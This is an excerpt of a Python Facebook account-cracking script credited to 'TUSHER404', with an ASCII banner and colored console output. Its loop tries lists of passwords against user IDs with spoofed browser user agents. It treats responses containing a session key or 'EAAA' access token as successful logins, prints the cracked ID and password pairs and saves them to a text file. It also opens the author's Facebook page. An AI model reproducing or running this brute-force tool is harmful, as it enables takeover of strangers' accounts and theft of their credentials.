...
d888888b db    db .d8888. db   db d88888b d8888b. 
`~~88~~' 88    88 88'  YP 88   88 88'     88  `8D 
   88    88    88 `8bo.   88ooo88 88ooooo 88oobY' 
   88    88    88   `Y8b. 88~~~88 88~~~~~ 88`8b   
   88    88b  d88 db   8D 88   88 88.     88 `88. 
   YP    ~Y8888P' `8888Y' YP   YP Y88888P 88   YD 
...
\033[1;32m[-]\033[1;32mAUTHOR    :\033[1;32m TUSHER404
\033[1;32m[-]\033[1;32mGITHUB    :\033[1;32m TUSHER404
\033[1;32m[-]\033[1;32mTEAM      :\033[1;32m BAN
\033[1;32m===============================================================
...
class Main:
	...
	def __init__(self):
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/tusher.tera.real.papa")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]>%s/[TUSHER]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-TUSHER] %s | %s\033[0;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("Successful-TUSHER.txt","a").write(" %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[1;32m[Successful-TUSHER %s | %s\033[1;32m         "%(uid, pw))
